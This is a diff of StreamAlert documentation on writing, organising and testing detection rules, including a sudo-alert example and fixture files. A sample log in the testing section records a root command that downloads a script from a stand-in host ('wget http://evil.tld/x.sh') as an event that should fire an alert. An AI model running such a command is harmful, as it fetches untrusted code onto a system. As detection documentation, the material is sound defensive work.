@@ -9,34 +9,51 @@ Rules
 * Rule alerts can be sent to one or more outputs, like S3, PagerDuty or Slack
 * Rules can be unit tested and integration tested
 
-Location
---------
+Getting Started
+---------------
 
-Rules are stored in the ``rules/`` sub-directory
+* Rules are located in the ``rules/`` sub-directory.
+* Generally, a separate rule file should be created for each cluster defined in the ``variables.json`` file.
+  * examples: ``corp.py``, ``pci.py``, or ``production.py``
+  * This structure is optional, you can organize rules however you would like.
 
-A separate .py should be made for each cluster you defined in the variables.json file.
+After defining a new rule file, you must import them in the ``main.py`` file (found in the repo root).  For the given examples above, this would be::
 
-Example: ``it.py``, ``pci.py``, ``production.py``
+  from rules import (
+      corp,
+      pci,
+      production
+  )
+
+.. note:: If you skip the above step, your rules will not load when AWS Lambda runs.
 
 Overview
 --------
 
-All rules take this form::
+Each new rule file must contain the following at the top::
 
-    @rule('example', logs=[...], matchers=[...], outputs=[...])
+  from stream_alert import rule_helpers
+  from stream_alert.rules_engine import StreamRules
+  rule = StreamRules.rule
+
+All rules take this structure::
+
+    @rule('example', 
+          logs=[...],
+          matchers=[...],
+          outputs=[...])
     def example(record):
-        # analyze the incoming record w/your logic
-        return (
-            # return true if an alert should be sent
-        )
+        # record analysis             # analyze the incoming record w/ your logic
+        return True                   # return True if an alert should be sent
 
-``record`` is an incoming record from any one of the configured datasources. You define ``logs`` and ``matchers`` to ensure the logic within the ``def`` function block only runs against logs that it should.
-
+You define a list of ``logs`` that the rule is applicable to.  Rules will only be evaluated against incoming records that match the declared log types.
 
 Example
 -------
 
 Here’s an example that alerts on the use of sudo in a PCI environment::
+
+    from fnmatch import fnmatch
 
     @rule('production_sudo',                          # name of the rule
           logs=['osquery'],                           # applicable datasource(s)
@@ -58,25 +75,24 @@ Parameter Details
 logs
 ~~~~~~~~~~~
 
-``logs`` defines the log sources the rule supports; the ``def`` function block is not run unless this condition is satisfied.
+``logs`` define the log sources the rule supports; the ``def`` function block is not run unless this condition is satisfied.
 
-A rule can be run against multiple log sources if desired.
-
-Log sources (e.g. datasources) are defined in ``conf/sources.json`` and subsequent schemas are defined in ``conf/logs.json``. For more details on how to setup a datasource, please see the Datasources section.
+* A rule can be run against multiple log sources if desired.
+* Log sources (e.g. datasources) are defined in ``conf/sources.json`` and subsequent schemas are defined in ``conf/logs.json``. For more details on how to setup a datasource, please see the Datasources section.
 
 matchers
 ~~~~~~~~
 
-``matchers`` defines the conditions that need to be satisfied in order for the ``def`` function block to run against an incoming record.
+``matchers`` define the conditions that must be satisfied before rule is evaluated.  This serves two purposes:
 
-Matchers are defined in ``rules/matchers.py``
+* To extract common logic from rules, which improves readability and writability
+* To ensure necessary conditions are met before full analysis of an incoming record
 
-Matchers can serve 2 purposes:
+Matchers are defined in ``rules/matchers.py`. If desired, matchers can also be defined in rule files if the following line is added to the top::
 
-* To extract common logic into helpers. This improves readability and writability
-* To ensure necessary conditions are met prior to analysis of the incoming record
+  matcher = StreamRules.matcher
 
-In the above example, we are evaluating the ``pci`` matcher. As you can likely deduce, this ensures rule logic is only run if the incoming record is coming from the pci environment. This is achieved by looking for a particular field in the log. The code::
+In the above example, we are evaluating the ``pci`` matcher.  As you can likely deduce, this ensures alerts are only triggered if the incoming record is from the ``pci`` environment. This is achieved by looking for a particular field in the log. The code::
 
     @matcher('pci')
     def is_prod_env(record):
@@ -86,14 +102,14 @@ In the above example, we are evaluating the ``pci`` matcher. As you can likely d
 outputs
 ~~~~~~~
 
-``outputs`` defines where the alert should be sent to, if the return value of the function is true.
+``outputs`` define where the alert should be sent to, if the return value of the function is ``True``.
 
-StreamAlert supports sending alerts to PagerDuty, Slack and AWS S3. As demonstrated in the example, an alert can be sent to multiple destinations.
+StreamAlert supports sending alerts to PagerDuty, Slack and Amazon S3. As demonstrated in the example, an alert can be sent to multiple destinations.
 
 
 Helpers
 -------
-To improve readability and writeability, you can put commonly used logic in functions in ``stream_alert/rule_helpers.py`` and then call the function from within your rule.
+To improve readability and writability of rules, you can extract commonly used ``Python`` processing logic into custom helper methods.   These helpers are defined in ``stream_alert/rule_helpers.py`` and can be called from within a matcher or rule.
 
 Example function::
 
@@ -113,50 +129,62 @@ Example use of that function within a rule::
 
     @rule('foobar', ...)
     def foobar(record):
-        ...
-        user = ...
-        user_whitelist = ...
-        ...
-        return (
-          in_set(user,user_whitelist)
-        )
+        user = 'joe'
+        user_whitelist = { 'mike', 'jin', 'jack', 'mary' }
+
+        return in_set(user, user_whitelist)
 
 
-Testing
--------
+Rules Testing
+-------------
 
-The ``test/fixtures/kinesis/`` subdirectory will contain folders for each cluster/environment.
+In order to test the effectiveness of our new rules, you can run a set of local integration tests to verify alerts would be triggered.  The `stream_alert_cli.py` command line tool comes built-in with a `lambda test` command.
 
-Within each of these folders you can define:
+Configuration
+~~~~~~~~~~~~~
 
-* ``non_trigger_events.json``
+To get started, create (or find) an example log for your given rule.  If the rule you added expects incoming records to be JSON, add a raw JSON record into the ``trigger_events.json `` file for the related stream.
+
+Example logs will be stored in the ``test/integration/fixtures/kinesis`` subdirectory.  A new folder should be created for each Kinesis stream as declared in your `sources.json <conf-datasources.html>`_.  
+
+Within each of these folders, add the following two files:
+
 * ``trigger_events.json``
+* ``non_trigger_events.json``
 
-This allows you to unit test your rules for expected behavior.
+These files allow you to separate true positives from false positives.
 
-Recall our earlier example that alerts on the use of sudo in the pci environment. In ``trigger_events.json``, you would add an example log that should alert::
+Recall our earlier example that alerts on the use of ``sudo`` in the ``pci`` environment. In ``trigger_events.json``, you would add an example log that should alert::
 
-    {
-    "name":"linux_syslog_auth",
-    "hostIdentifier":"foobar",
-    "unixTime":"1470824034",
-    "decorations":{
-        "envIdentifier":"pci",
-        "roleIdentifier":"memcache"
-        },
-    "columns":{
-        "tag":"sudo",
-        "message":"john_adams : TTY=pts/0 ; PWD=/home/john_adams ; USER=root ; COMMAND=/usr/bin/wget http://evil.tld/x.sh",
-        "facility": "authpriv"
+  {
+    "name": "linux_syslog_auth",
+    "hostIdentifier": "foobar",
+    "unixTime": "1470824034",
+    "decorations": {
+      "envIdentifier": "pci",
+      "roleIdentifier": "memcache"
     },
-    "action":"added"
-    }
-
+    "columns": {
+      "tag": "sudo",
+      "message": "john_adams : TTY=pts/0 ; PWD=/home/john_adams ; USER=root ; COMMAND=/usr/bin/wget http://evil.tld/x.sh",
+      "facility": "authpriv"
+    },
+    "action": "added"
+  }
 
 .. warning:: One event per line. This log was put on multiple lines for readability and education purposes.
 
 And lastly, in ``non_trigger_events.json``, you would add an example that shouldn't fire.
 
+Running Tests
+~~~~~~~~~~~~~
 
+To test an example record coming from Kinesis::
+  
+  ./stream_alert_cli.py lambda test --func alert --source kinesis
 
+To test example records from S3::
+  
+  ./stream_alert_cli.py lambda test --func alert --source s3
 
+.. note:: coming soon - Amazon S3 testing instructions
